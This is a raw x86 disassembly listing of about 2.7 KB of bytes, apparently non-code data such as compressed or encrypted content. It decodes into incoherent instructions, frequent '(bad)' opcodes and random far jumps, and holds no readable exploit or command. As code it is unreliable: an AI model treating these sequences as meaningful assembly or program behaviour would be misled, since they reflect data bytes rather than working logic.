  4205e6:	inc    ecx
  4205e7:	mov    esp,0x9b9690e2
  4205ec:	popf   
  4205ed:	out    dx,al
  4205ee:	cmp    DWORD PTR [edi],edi
  4205f0:	dec    esi
  4205f1:	(bad)  
  4205f2:	jg     0x420672
  4205f4:	mov    DWORD PTR [ebx-0x29],ebx
  4205f7:	sar    BYTE PTR [edi-0x5b51a72f],cl
  4205fd:	data16 hlt 
  4205ff:	pop    ebp
  420600:	mov    cl,0x8a
  420602:	in     eax,dx
  420603:	ror    BYTE PTR [edi-0x1],1
  420606:	ja     0x4205cd
  420608:	lock jb 0x420659
  42060b:	hlt    
  42060c:	je     0x42065d
  42060e:	push   ds
  42060f:	jno    0x420595
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	xor    DWORD PTR [edi+edi*8],0x1597543
  420687:	add    BYTE PTR ds:0x11000001,al
  42068d:	cmp    dl,ah
  42068f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420690:	adc    ebp,DWORD PTR [esp+eax*1+0x1a]
  420694:	jecxz  0x420704
  420696:	sbb    al,0x1e
  420698:	inc    eax
  420699:	xor    edi,DWORD PTR [ecx+0x2e]
  42069c:	push   ecx
  42069d:	out    0xcc,al
  42069f:	into   
  4206a0:	cld    
  4206a1:	out    0xd5,al
  4206a3:	xchg   BYTE PTR [edi+0x4567c9d6],cl
  4206a9:	sar    BYTE PTR [esi+0x40],cl
  4206ac:	in     al,dx
  4206ad:	adc    cl,BYTE PTR [ecx+0x5b3b0a43]
  4206b3:	jnp    0x420707
  4206b5:	retf   0x6495
  4206b8:	inc    ebx
  4206b9:	mov    edx,0xb1244443
  4206be:	push   ebx
  4206bf:	mov    WORD PTR [ebp-0x4854d31e],?
  4206c5:	pop    ebp
  4206c6:	rcr    BYTE PTR [edx],cl
  4206c8:	sub    edx,0xb728f1f8
  4206ce:	(bad)  
  4206cf:	mov    esi,0x881db93d
  4206d4:	xlat   BYTE PTR ds:[ebx]
  4206d5:	sbb    esi,eax
  4206d7:	icebp  
  4206d8:	clc    
  4206d9:	or     ebp,edx
  4206db:	and    ch,BYTE PTR [edx-0x36922f4a]
  4206e1:	ret    0x4c40
  4206e4:	and    DWORD PTR [ecx+edi*4],0x29025068
  4206eb:	mov    esi,0x34ccfced
  4206f0:	pop    eax
  4206f1:	(bad)  
  4206f2:	mov    ?,WORD PTR [ecx]
  4206f4:	test   al,0x74
  4206f6:	xchg   DWORD PTR [edi+0x24258c64],eax
  4206fc:	je     0x420699
  4206fe:	xchg   esp,eax
  4206ff:	mov    dl,0x69
  420701:	je     0x420733
  420703:	jle    0x420761
  420705:	xor    al,0xe
  420707:	xchg   ebx,eax
  420708:	add    al,0x52
  42070a:	xchg   edi,eax
  42070b:	mov    ebp,0x5e645bd1
  420710:	jne    0x4206f2
  420712:	std    
  420713:	xchg   edi,eax
  420714:	(bad)  
  420715:	jg     0x420755
  420717:	xchg   esp,eax
  420718:	ret    0x5920
  42071b:	add    bh,al
  42071d:	mov    bl,0x70
  42071f:	imul   ebx,DWORD PTR [ebx],0x6c24ceb1
  420725:	pusha  
  420726:	leave  
  420727:	cli    
  420728:	inc    ebp
  420729:	xchg   ebx,eax
  42072a:	push   ebx
  42072b:	test   DWORD PTR [edx+0x5fbc818f],0x72efe8ce
  420735:	dec    ebp
  420736:	and    BYTE PTR [edx-0x2],dh
  420739:	(bad)  
  42073a:	jle    0x420755
  42073c:	mov    bh,BYTE PTR [edi+0x5a016738]
  420742:	xchg   ecx,eax
  420743:	sub    DWORD PTR [edi-0x67],eax
  420746:	mov    eax,DWORD PTR [ebx]
  420748:	sub    eax,0xae6f5418
  42074d:	mov    al,0x7d
  42074f:	sub    eax,0x58d8ddfd
  420754:	mov    cl,0x43
  420756:	jmp    0x7e5f:0xee74c02f
  42075d:	leave  
  42075e:	ficomp WORD PTR [ebx+0x69]
  420761:	je     0x420710
  420763:	push   esp
  420764:	pop    eax
  420765:	mov    eax,ecx
  420767:	fimul  DWORD PTR [eax]
  420769:	sub    al,0x0
  42076b:	sbb    esi,DWORD PTR [esi-0xcf82e91]
  420771:	inc    ebx
  420772:	(bad)  
  420773:	jmp    0xd491:0x702794a
  42077a:	shr    BYTE PTR [esi],cl
  42077c:	mov    DWORD PTR [ecx-0x77d88276],esp
  420782:	fild   WORD PTR [esi]
  420784:	mov    bh,0x2b
  420786:	sub    BYTE PTR [ebp+0x406cc51f],ah
  42078c:	clc    
  42078d:	ss (bad) 
  42078f:	mov    edx,0xa3
	...
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	mov    dl,0x29
  420802:	mov    al,0x4
  420804:	jp     0x420860
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x79000001
  42080d:	adc    eax,0x96b6fb53
  420812:	in     eax,0xc0
  420814:	mov    al,gs:0x4415c35f
  42081a:	fstp   DWORD PTR [ecx-0x24]
  42081d:	imul   edi,DWORD PTR [eax-0x48],0x63cd3a56
  420824:	jp     0x42084b
  420826:	and    esi,edi
  420828:	mov    ch,0x7a
  42082a:	rcr    eax,0x0
  42082d:	sar    edi,1
  42082f:	enter  0x348c,0xf9
  420833:	mov    al,ds:0xd985c7fb
  420838:	lods   eax,DWORD PTR ds:[esi]
  420839:	pop    esp
  42083a:	lods   al,BYTE PTR ds:[esi]
  42083b:	popf   
  42083c:	or     DWORD PTR [eax],0xd508e104
  420842:	xor    dh,BYTE PTR [esi+0xdc7a036]
  420848:	fcmovnu st,st(4)
  42084a:	push   edx
  42084b:	sbb    bh,BYTE PTR [edx-0x542c2d13]
  420851:	cmc    
  420852:	ret    0x9541
  420855:	pop    esi
  420856:	test   eax,0xcd9198b0
  42085b:	push   es
  42085c:	or     al,BYTE PTR [ebp-0x37e1815a]
  420862:	jne    0x42080b
  420864:	loopne 0x420829
  420866:	sbb    eax,0x3bbd5cba
  42086b:	out    dx,eax
  42086c:	xlat   BYTE PTR ds:[ebx]
  42086d:	fcom   DWORD PTR [ebp+edi*4+0x51c886c4]
  420874:	and    bl,dl
  420876:	pop    ecx
  420877:	pop    ebp
  420878:	sbb    eax,0x137e0b4c
  42087d:	pop    ebp
  42087e:	push   0x282eaac2
  420883:	fs and eax,0xd4290b33
  420889:	jns    0x42081d
  42088b:	retf   0x1ac2
  42088e:	xchg   ebp,eax
  42088f:	shr    DWORD PTR [esi-0x620974f3],cl
  420895:	dec    ebx
  420896:	push   esi
  420897:	in     al,0x52
  420899:	mov    esi,0x1e4e3d07
  42089e:	add    ebp,DWORD PTR ds:0xe5f42d02
  4208a4:	mov    edx,esi
  4208a6:	imul   esp,DWORD PTR [eax-0x62a651be],0xb80afd1f
  4208b0:	sbb    BYTE PTR [edx-0x2814afd7],ah
  4208b6:	mov    esi,0xfd3361f3
  4208bb:	and    DWORD PTR [edi-0x4d37d167],0xfbc57971
  4208c5:	into   
  4208c6:	xor    esi,ebp
  4208c8:	test   al,0xc0
  4208ca:	sbb    esi,DWORD PTR [edx+0x554396df]
  4208d0:	test   DWORD PTR [ebx],esp
  4208d2:	psubw  mm4,QWORD PTR [edx]
  4208d5:	or     ebp,edi
  4208d7:	xchg   DWORD PTR [eax],edi
  4208d9:	sbb    eax,0x8d8774d6
  4208de:	adc    eax,0xa5476fdc
  4208e3:	push   ebx
  4208e4:	es sbb al,0x2d
  4208e7:	jecxz  0x4208eb
  4208e9:	dec    esp
  4208ea:	add    WORD PTR [eax+0x1b],sp
  4208ee:	and    ch,BYTE PTR [edi]
  4208f0:	sub    eax,0x364fc3a7
  4208f5:	xchg   ebx,eax
  4208f6:	(bad)  
  4208f7:	xor    eax,0xfec2990c
  4208fc:	sbb    bl,0x21
  4208ff:	leave  
  420900:	pop    eax
  420901:	ins    DWORD PTR es:[edi],dx
  420902:	sub    ch,dh
  420904:	imul   esp,DWORD PTR [eax+eiz*8+0x24],0xffffffa9
  420909:	int    0xbe
  42090b:	xor    al,0x8b
  42090d:	sbb    al,0x97
  42090f:	xchg   ebp,eax
  420910:	mov    eax,ds:0x0
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x2c
  420981:	pop    ebp
  420982:	mov    edi,0x15b7f49
  420987:	add    BYTE PTR ds:0x9000001,al
  42098d:	inc    ebp
  42098e:	popa   
  42098f:	cs xchg edx,eax
  420991:	xchg   ecx,eax
  420992:	push   ebp
  420993:	scas   eax,DWORD PTR es:[edi]
  420994:	jp     0x4209c8
  420996:	pop    ds
  420997:	stc    
  420998:	mov    BYTE PTR [edi-0x11],dh
  42099b:	pop    ebx
  42099c:	sub    al,BYTE PTR [edi]
  42099e:	pop    edx
  42099f:	test   BYTE PTR [edi],0xf9
  4209a2:	lock jmp 0x420948
  4209a5:	inc    eax
  4209a6:	and    al,0x32
  4209a8:	pop    edi
  4209a9:	cmp    BYTE PTR [eax+0x72],bh
  4209ac:	jp     0x4209a3
  4209ae:	out    dx,eax
  4209af:	pop    es
  4209b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209b1:	rol    BYTE PTR [esi+0x5],0x82
  4209b5:	in     al,0x95
  4209b7:	outs   dx,BYTE PTR ds:[esi]
  4209b8:	push   eax
  4209b9:	or     dl,cl
  4209bb:	mov    bl,0xfc
  4209bd:	mov    ds:0x45154e31,al
  4209c2:	clc    
  4209c3:	retf   
  4209c4:	jo     0x420a3a
  4209c6:	sti    
  4209c7:	sbb    eax,0x7c6d33f4
  4209cc:	inc    esp
  4209cd:	add    esp,0x40b11dc3
  4209d3:	push   es
  4209d4:	push   ebx
  4209d5:	mov    ?,eax
  4209d7:	jbe    0x420a48
  4209d9:	pop    edi
  4209da:	mov    esp,0x24ade8da
  4209df:	test   edi,esi
  4209e1:	iret   
  4209e2:	cdq    
  4209e3:	mov    ebp,0x6e6c72a1
  4209e8:	mov    ah,0x2b
  4209ea:	dec    ebx
  4209eb:	pop    ds
  4209ec:	add    BYTE PTR [eax-0x7d],0xd1
  4209f0:	icebp  
  4209f1:	xchg   ecx,eax
  4209f2:	ins    DWORD PTR es:[edi],dx
  4209f3:	mov    eax,ds:0xc5465235
  4209f8:	test   eax,0xf1d7c7d0
  4209fd:	cld    
  4209fe:	adc    BYTE PTR [ebp+eiz*8-0x60627cb9],dh
  420a05:	jp     0x4209cb
  420a07:	jno    0x420a23
  420a09:	xor    BYTE PTR [edi],dl
  420a0b:	pop    ss
  420a0c:	dec    ecx
  420a0d:	push   0xe67a5275
  420a12:	sbb    eax,0xd00adee0
  420a17:	mov    al,ds:0x2d160046
  420a1c:	ror    BYTE PTR [ebx+ecx*2],0xc5
  420a20:	or     al,0x29
  420a22:	and    DWORD PTR [ebx-0x7a],ecx
  420a25:	shr    esp,cl
  420a27:	in     al,dx
  420a28:	and    eax,edi
  420a2a:	adc    al,0x8d
  420a2c:	inc    edi
  420a2d:	pop    edx
  420a2e:	sbb    al,0x6
  420a30:	arpl   cx,ax
  420a32:	jbe    0x420a32
  420a34:	add    BYTE PTR ss:[edi],cl
  420a37:	push   ebp
  420a38:	loopne 0x420a25
  420a3a:	sub    DWORD PTR [ebp-0x33],esi
  420a3d:	or     BYTE PTR [ebp-0x2d],bh
  420a40:	pop    ecx
  420a41:	(bad)  
  420a42:	mov    eax,0x69ff2aba
  420a47:	push   cs
  420a48:	or     DWORD PTR [ecx+0x3a7fbf47],0x3702a38e
  420a52:	adc    ebx,edx
  420a54:	fld    QWORD PTR [edi+0x51]
  420a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a58:	inc    ebx
  420a59:	ds mov bh,0xe6
  420a5c:	add    BYTE PTR [edx+0x7d945a1c],cl
  420a62:	int    0xa5
  420a64:	pushf  
  420a65:	test   BYTE PTR [edx+ecx*2],0x68
  420a69:	mov    bl,0xfe
  420a6b:	xchg   DWORD PTR ss:[eax],eax
  420a6e:	outs   dx,BYTE PTR ds:[esi]
  420a6f:	mov    cl,0xcc
  420a71:	jecxz  0x420ab7
  420a73:	clc    
  420a74:	jecxz  0x420aea
  420a76:	jb     0x420a4b
  420a78:	lahf   
  420a79:	mov    dh,0xa0
  420a7b:	sar    BYTE PTR [eax],0x6b
  420a7e:	popa   
  420a7f:	enter  0xe397,0x10
  420a83:	pushf  
  420a84:	jnp    0x420a90
  420a86:	adc    BYTE PTR [ebx],bl
  420a88:	xchg   edx,eax
  420a89:	bound  esi,QWORD PTR es:[ecx+ebp*4-0x3b493e84]
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	mov    ebx,0x8453c80e
  420b05:	pop    esp
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    eax,0x35000001
  420b0d:	adc    BYTE PTR [eax+0x68c863c8],al
  420b13:	nop
  420b14:	test   eax,0x45fde98
  420b19:	scas   al,BYTE PTR es:[edi]
  420b1a:	pop    esi
  420b1b:	jecxz  0x420adc
  420b1d:	mov    ebp,0xe77afa0d
  420b22:	mov    ebx,0x76586936
  420b27:	inc    edi
  420b28:	inc    eax
  420b29:	jne    0x420b31
  420b2b:	mov    edi,0xb07f91c4
  420b30:	jae    0x420b81
  420b32:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  420b34:	fwait
  420b35:	xchg   esp,eax
  420b36:	fs and al,0x9c
  420b39:	iret   
  420b3a:	scas   al,BYTE PTR es:[edi]
  420b3b:	ins    DWORD PTR es:[edi],dx
  420b3c:	addr16 mov dl,0x97
  420b3f:	not    BYTE PTR [ebx-0x50]
  420b42:	dec    edi
  420b43:	xor    DWORD PTR [ebx-0x27],0xffffff8c
  420b47:	push   es
  420b48:	sbb    eax,0x9155f22
  420b4d:	add    al,0x10
  420b4f:	dec    DWORD PTR [ebp+ebp*1+0x60b2eaf2]
  420b56:	sbb    al,BYTE PTR fs:[eax-0x7b]
  420b5a:	dec    edi
  420b5b:	xor    al,0x17
  420b5d:	outs   dx,BYTE PTR ds:[esi]
  420b5e:	scas   al,BYTE PTR es:[edi]
  420b5f:	xor    DWORD PTR [ecx-0x3d0b8e02],0xf154e4f9
  420b69:	and    DWORD PTR ds:0x82fc0a08,ebp
  420b6f:	cmp    ebx,DWORD PTR [ebx+0x6b626308]
  420b75:	jno    0x420baa
  420b77:	les    eax,FWORD PTR [esi-0x48]
  420b7a:	pop    ebx
  420b7b:	jno    0x420b34
  420b7d:	dec    esp
  420b7e:	pusha  
  420b7f:	shl    BYTE PTR [eax-0x30],1
  420b82:	imul   BYTE PTR [ecx-0x34]
  420b85:	je     0x420b70
  420b87:	jmp    DWORD PTR [ecx-0x3]
  420b8a:	into   
  420b8b:	jge    0x420b60
  420b8d:	mov    dh,0x8f
  420b8f:	add    ecx,esp
  420b91:	stos   DWORD PTR es:[edi],eax
  420b92:	pop    esp
  420b93:	push   eax
  420b94:	mov    ds:0x59adba30,al
  420b99:	loope  0x420bc5
  420b9b:	pop    eax
  420b9c:	repnz (bad) 
  420b9e:	sbb    eax,0x60ed620b
  420ba3:	mov    edi,?
  420ba5:	mov    ebx,0x92ad7126
  420baa:	jae    0x420c13
  420bac:	bound  ebp,QWORD PTR [ebx+edi*8+0x30958a48]
  420bb3:	idiv   BYTE PTR [ebp-0x437807c2]
  420bb9:	and    ebp,ebx
  420bbb:	lods   al,BYTE PTR ds:[esi]
  420bbc:	sbb    eax,0x171e0704
  420bc1:	(bad)  
  420bc3:	add    ecx,edi
  420bc5:	and    DWORD PTR [eax+0x21],ecx
  420bc8:	aad    0x9c
  420bca:	push   edi
  420bcb:	dec    ebp
  420bcc:	outs   dx,DWORD PTR ds:[esi]
  420bcd:	sbb    eax,0x7c8e507a
  420bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bd3:	daa    
  420bd4:	ja     0x420b73
  420bd6:	into   
  420bd7:	repz test eax,0xe2f26b61
  420bdd:	(bad)  
  420bde:	aam    0xc1
  420be0:	mov    al,0x33
  420be2:	fdiv   DWORD PTR cs:[esp+ebx*4]
  420be6:	lock cld 
  420be8:	out    0xdd,al
  420bea:	sbb    DWORD PTR [edx+0x66],0x43da53c8
  420bf1:	test   dl,dh
  420bf3:	jns    0x420be3
  420bf5:	shl    DWORD PTR [esi+0x75],cl
  420bf8:	test   DWORD PTR [eax+esi*8-0x1560e5d0],ebp
  420bff:	lock sbb bl,BYTE PTR [edx]
  420c02:	ss fs iret 
  420c05:	cmp    eax,0x222d0286
  420c0a:	(bad)
  420c0d:	jns    0x420baf
  420c0f:	lds    ecx,FWORD PTR [ebx+0x0]
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	cmp    al,0x18
  420c82:	sbb    BYTE PTR [ebp-0x77],dl
  420c85:	pop    ebp
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    eax,0x97000001
  420c8d:	mov    esi,0xd7ee804e
  420c92:	dec    esi
  420c93:	stc    
  420c94:	sub    BYTE PTR [edx+esi*4-0xf],0x71
  420c99:	outs   dx,BYTE PTR ds:[esi]
  420c9a:	xor    al,0x6c
  420c9c:	ss ja  0x420cd9
  420c9f:	sbb    BYTE PTR [edx-0x7a],bh
  420ca2:	(bad)  
  420ca3:	push   edx
  420ca4:	pop    eax
  420ca5:	retf   
  420ca6:	outs   dx,BYTE PTR ds:[esi]
  420ca7:	inc    ebx
  420ca8:	mov    edx,0x6008e6ca
  420cad:	push   ss
  420cae:	jae    0x420c45
  420cb0:	enter  0x2f5b,0xb5
  420cb4:	mov    bl,0x1e
  420cb6:	mov    edx,edi
  420cb8:	mov    al,BYTE PTR [eax+0x59]
  420cbb:	add    DWORD PTR [esi+0x50],edi
  420cbe:	or     cl,BYTE PTR [edi+0xeefd6e8]
  420cc4:	aam    0xa1
  420cc6:	pop    esp
  420cc7:	test   al,0xe3
  420cc9:	fcmovnbe st,st(7)
  420ccb:	in     eax,0xcf
  420ccd:	fdivr  QWORD PTR [ecx-0x16]
  420cd0:	push   ecx
  420cd1:	or     ebp,DWORD PTR [ecx-0xad12742]
  420cd7:	or     eax,eax
  420cd9:	mov    dh,ch
  420cdb:	xchg   edx,eax
  420cdc:	mov    bl,0x73
  420cde:	dec    edx
  420cdf:	add    al,0xbd
  420ce1:	sbb    al,0xc8
  420ce3:	mov    BYTE PTR [esi+0x464491d8],cl
  420ce9:	inc    esi
  420cea:	rcr    BYTE PTR [eax-0x5f53557e],cl
  420cf0:	or     ebp,DWORD PTR [ecx-0x60af88d6]
  420cf6:	cs jp  0x420cd4
  420cf9:	fdivr  DWORD PTR [ebx+0x3]
  420cfc:	mov    cl,0x33
  420cfe:	inc    edx
  420cff:	stc    
  420d00:	mov    esp,0xbb4f30f
  420d05:	push   esp
  420d06:	dec    ebx
  420d07:	call   0x98ed:0xd26d818a
  420d0e:	jp     0x420d2e
  420d10:	loope  0x420d19
  420d12:	push   ebx
  420d13:	sub    BYTE PTR ds:0xe9fcc725,bl
  420d19:	mov    BYTE PTR [edi-0x23],al
  420d1c:	sub    bl,BYTE PTR [edi]
  420d1e:	aad    0xab
  420d20:	pop    ebp
  420d21:	push   0x2d
  420d23:	clc    
  420d24:	je     0x420d77
  420d26:	rol    edi,1
  420d28:	mov    cl,0xc4
  420d2a:	jbe    0x420d73
  420d2c:	add    BYTE PTR [esi+0x572429df],dl
  420d32:	push   ebp
  420d33:	lods   al,BYTE PTR ds:[esi]
  420d34:	mov    ebp,0xd130a0fb
  420d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d3a:	std    
  420d3b:	xchg   esi,eax
  420d3c:	cmp    al,0x41
  420d3e:	cmp    bl,BYTE PTR [ebx-0x7a]
  420d41:	mov    edx,ds
  420d43:	xchg   edx,eax
  420d44:	out    dx,eax
  420d45:	mov    cs,esi
  420d47:	mov    DWORD PTR [eax+0x250a1327],edx
  420d4d:	jbe    0x420d49
  420d4f:	sbb    ah,bl
  420d51:	test   eax,0x67ab3cc9
  420d56:	popf   
  420d57:	fldlg2 
  420d59:	(bad)  
  420d5a:	lea    esi,ss:[ebx]
  420d5d:	cmc    
  420d5e:	icebp  
  420d5f:	xchg   esi,eax
  420d60:	jno    0x420d10
  420d62:	ja     0x420d03
  420d64:	test   eax,0x4a39d94
  420d69:	push   0xffffffda
  420d6b:	dec    ebx
  420d6c:	jecxz  0x420d91
  420d6e:	jge    0x420dd3
  420d70:	add    ah,BYTE PTR [edi-0x31]
  420d73:	dec    esp
  420d74:	shl    edx,0x22
  420d77:	sbb    al,0x1c
  420d79:	shl    ebp,0xd1
  420d7c:	popf   
  420d7d:	(bad)  
  420d7e:	and    DWORD PTR [ebp-0x649f3b82],edx
  420d84:	mov    ebp,0xdaa05ca9
  420d89:	or     ch,BYTE PTR ds:0xedd69740
  420d8f:	pop    es
  420d90:	mov    eax,DWORD PTR [eax]
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xf8cf21f8
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0x69000001,al
  420e0d:	inc    esi
  420e0e:	retf   0x71a7
  420e11:	(bad)  
  420e12:	jae    0x420e52
  420e14:	nop
  420e15:	pop    eax
  420e16:	(bad)  
  420e17:	in     eax,0x77
  420e19:	mov    esp,0x800feff9
  420e1e:	mov    WORD PTR [eax-0x708a69f6],fs
  420e24:	or     eax,0xc43b05b
  420e29:	mov    dh,0x4a
  420e2b:	and    ah,dh
  420e2d:	sub    eax,0x3bbd094e
  420e32:	jb     0x420dbb
  420e34:	std    
  420e35:	push   0xfffffff0
  420e37:	mov    ds:0x23c0a208,al
  420e3c:	test   DWORD PTR [eax],ebx
  420e3e:	add    edx,edx
  420e40:	push   ss
  420e41:	int3   
  420e42:	cmp    eax,DWORD PTR [esi+edi*1+0x4596137e]
  420e49:	mov    dh,0x29
  420e4b:	mov    edx,0xf5319a9c
  420e50:	arpl   WORD PTR [edx],bp
  420e52:	or     al,0xb2
  420e54:	(bad)  
  420e55:	jo     0x420e8f
  420e57:	div    BYTE PTR [edi-0x11]
  420e5a:	sub    BYTE PTR [ebp+0x117213c8],al
  420e60:	xor    DWORD PTR [edi],esi
  420e62:	cdq    
  420e63:	aad    0xe1
  420e65:	int    0x45
  420e67:	outs   dx,DWORD PTR ds:[esi]
  420e68:	stos   DWORD PTR es:[edi],eax
  420e69:	lahf   
  420e6a:	cs mov esi,0x666deb54
  420e70:	addr16 push cs
  420e72:	jmp    0x420ef1
  420e74:	mov    bl,0xd6
  420e76:	adc    ecx,DWORD PTR [edx+0x7ad0a3ba]
  420e7c:	push   DWORD PTR [esi]
  420e7e:	ja     0x420eff
  420e80:	(bad)  
  420e82:	jl     0x420e74
  420e84:	rcr    BYTE PTR [eax+0x6d],0xee
  420e88:	(bad)
  420e8b:	call   0x47de6dab
  420e90:	imul   esi,DWORD PTR [eax-0x12f82057],0x7913ceed
  420e9a:	pop    eax
  420e9b:	sbb    ebx,ebp
  420e9d:	daa    
  420e9e:	inc    ebx
  420e9f:	and    BYTE PTR [esi+0x66de078b],dh
  420ea5:	ins    BYTE PTR es:[edi],dx
  420ea6:	lds    esi,FWORD PTR [eax]
  420ea8:	mov    ecx,0xc22597a7
  420ead:	jno    0x420e54
  420eaf:	mov    fs,WORD PTR [esi+0x530fe8fe]
  420eb5:	inc    esp
  420eb6:	lock inc ecx
  420eb8:	popa   
  420eb9:	scas   al,BYTE PTR es:[edi]
  420eba:	xchg   BYTE PTR [ebp-0x11a31599],dl
  420ec0:	fbld   TBYTE PTR [ebx]
  420ec2:	push   ebx
  420ec3:	hlt    
  420ec4:	je     0x420f0a
  420ec6:	jp     0x420e7d
  420ec8:	add    BYTE PTR fs:[edx],0x60
  420ecc:	sub    eax,0xdadfe5d7
  420ed1:	mov    ah,0x32
  420ed3:	ds push esp
  420ed5:	pop    edi
  420ed6:	xor    DWORD PTR [edx],esi
  420ed8:	test   DWORD PTR [ebx+0x49],0x8b1d317b
  420edf:	pop    es
  420ee0:	push   ds
  420ee1:	mov    ecx,0x39f08021
  420ee6:	scas   eax,DWORD PTR es:[edi]
  420ee7:	in     eax,dx
  420ee8:	call   0x9d0276a7
  420eed:	push   esi
  420eee:	movups xmm7,xmm0
  420ef1:	fsub   DWORD PTR [ebp-0x8]
  420ef4:	aam    0x5e
  420ef6:	pop    ss
  420ef7:	ficomp WORD PTR [ebx-0x6f]
  420efa:	aaa    
  420efb:	ficom  DWORD PTR ds:0x3af15151
  420f01:	and    DWORD PTR [edi],eax
  420f03:	xor    eax,DWORD PTR [ecx-0x70]
  420f06:	mov    ecx,0xdcbba5c
  420f0b:	mov    ch,0x2c
  420f0d:	push   ebp
  420f0e:	call   0x422c60
	...
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x82ef8a4]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0xb1000001
  420f8d:	xchg   ebp,eax
  420f8e:	out    0x24,eax
  420f90:	mov    eax,ds:0x136bdfac
  420f95:	add    eax,0x5c152ab5
  420f9a:	mov    ebp,0xe38d1280
  420f9f:	or     BYTE PTR [edx+0xe],ch
  420fa2:	shl    DWORD PTR [edx+0x45],1
  420fa5:	inc    eax
  420fa6:	mov    ecx,0x8a2543e
  420fab:	retf   0x26a4
  420fae:	les    eax,FWORD PTR [edx+0x43234c42]
  420fb4:	sub    al,0xeb
  420fb6:	das    
  420fb7:	add    eax,0xecb37a96
  420fbc:	imul   ebx,esp,0xffffffee
  420fbf:	jl     0x420f6f
  420fc1:	inc    edi
  420fc2:	not    DWORD PTR [ecx+0x343e0623]
  420fc8:	mov    bl,BYTE PTR [ebp+0x7cfedb76]
  420fce:	sbb    ah,cl
  420fd0:	jg     0x420f8c
  420fd2:	ins    BYTE PTR es:[edi],dx
  420fd3:	pushf  
  420fd4:	mov    cl,0x8f
  420fd6:	pop    esp
  420fd7:	ins    DWORD PTR es:[edi],dx
  420fd8:	mov    dh,0xab
  420fda:	std    
  420fdb:	mov    edi,0x34ffcdc4
  420fe0:	ins    DWORD PTR es:[edi],dx
  420fe1:	outs   dx,DWORD PTR ds:[esi]
  420fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fe3:	in     eax,0x31
  420fe5:	loopne 0x421044
  420fe7:	mov    al,ds:0x82c86b10
  420fec:	das    
  420fed:	call   0xe88e:0x58d39fc7
  420ff4:	xchg   BYTE PTR ds:0x2a1ae15c,bl
  420ffa:	mov    eax,0xcb44c310
  420fff:	mov    ecx,0x454fa003
  421004:	rol    BYTE PTR [ebx+0x5d7ef85],cl
  42100a:	sbb    al,BYTE PTR [esi]
  42100c:	pop    eax
  42100d:	jp     0x421028
  42100f:	sub    bh,BYTE PTR [ebp+0x6c]
  421012:	mov    al,ds:0x855ff9fe
  421017:	lods   eax,DWORD PTR ds:[esi]
  421018:	inc    eax
  421019:	cmp    BYTE PTR [eax+0x5a],dl
  42101c:	sbb    al,0x59
  42101e:	inc    esp
  42101f:	je     0x421040
  421021:	push   ebx
  421022:	adc    al,0x7d
  421024:	repz push edi
  421026:	addr16 mov dh,0xf6
  421029:	sti    
  42102a:	retf   
  42102b:	pop    ds
  42102c:	icebp  
  42102d:	push   esp
  42102e:	sti    
  42102f:	retf   0x9f36
  421032:	cwde   
  421033:	sbb    eax,0x2b33ffe0
  421038:	cmp    ebp,edx
  42103a:	gs mov dl,0x87
  42103d:	rcl    BYTE PTR [ebx-0x20],0xfc
  421041:	ss mov al,0xb1
  421044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421045:	sbb    ebx,eax
  421047:	mov    cl,0x41
  421049:	lea    esp,[esp+eiz*8-0x76157707]
  421050:	cwde   
  421051:	popa   
  421052:	bound  esp,QWORD PTR [ebx+0x8]
  421055:	push   0xffffffb0
  421057:	xor    BYTE PTR [esi],bl
  421059:	add    dl,BYTE PTR [ecx-0x309c5f23]
  42105f:	and    al,0x98
  421061:	(bad)  
  421062:	retf   
  421063:	sub    dl,bl
  421065:	ins    BYTE PTR es:[edi],dx
  421066:	mov    esp,0x1e5024c8
  42106b:	sub    esi,DWORD PTR [esi+ebx*8-0x68]
  42106f:	or     BYTE PTR [ebx+0x7],bl
  421072:	and    al,0x4d
  421074:	aam    0x7a
  421076:	in     al,0xcc
  421078:	and    esp,ebp
  42107a:	fcomp  DWORD PTR [edi+0x48]
  42107d:	dec    ebx
  42107e:	mov    cs,esi
  421080:	mov    dl,0x11
  421082:	mov    eax,ds:0x57c5c11c
  421087:	in     al,0xda
